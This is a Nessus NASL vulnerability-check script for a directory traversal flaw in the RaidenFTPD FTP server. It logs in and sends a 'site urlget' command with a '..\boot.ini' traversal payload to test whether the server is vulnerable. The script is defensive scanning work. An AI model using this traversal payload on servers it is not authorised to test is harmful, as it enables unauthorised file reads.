#
#  This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#  Ref: Lachlan. H
#
#  This script is released under the GNU GPL v2
#

if(description)
{
 script_id(18225);
 script_cve_id("CVE-2005-1480");
 script_bugtraq_id(13292);
 if ( defined_func("script_xref") ) script_xref(name:"OSVDB", value:"15713");
 
 script_version ("$Revision: 1.4 $");

 name["english"] = "RaidenFTPD Unauthorized File Access flaw";

 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running the RaidenFTPD FTP server.

The remote version of this software is vulnerable to a directory
traversal flaw.  A malicious user could exploit it to obtain read
access to the outside of the intended ftp root. 

Solution : Upgrade to 2.4 build 2241 or newer.
Risk factor : Medium";

 script_description(english:desc["english"]);
 
 summary["english"] = "Detects RaidenFTPD Unauthorized File Access";
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
  
 script_copyright(english:"This script is Copyright (C) 2005 David Maciejak");
 family["english"] = "FTP";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "ftp_anonymous.nasl",
 		    "ftpserver_detect_type_nd_version.nasl");
 script_require_keys("ftp/login");
 script_require_ports("Services/ftp", 21);
 
 exit(0);
}

#
# The script code starts here
#

include("ftp_func.inc");
port = get_kb_item("Services/ftp");
if(!port)port = 21;

login = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");

if ( ! login || ! password ) exit(0);

banner = get_ftp_banner(port: port);
if ( ! banner ) exit(0);
if (!egrep(pattern:".*RaidenFTPD.*", string:banner))exit(0);


if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
 	     ftp_recv_line(socket:soc);
	     if(ftp_authenticate(socket:soc, user:login, pass:password))
	      {
   		s = string("quote site urlget file:/..\\boot.ini\r\n");
   		send(socket:soc, data:s);
   		r = ftp_recv_line(socket:soc);
		if ("220 site urlget " >< r) security_warning(port);

	      }
	close(soc);
  }
}
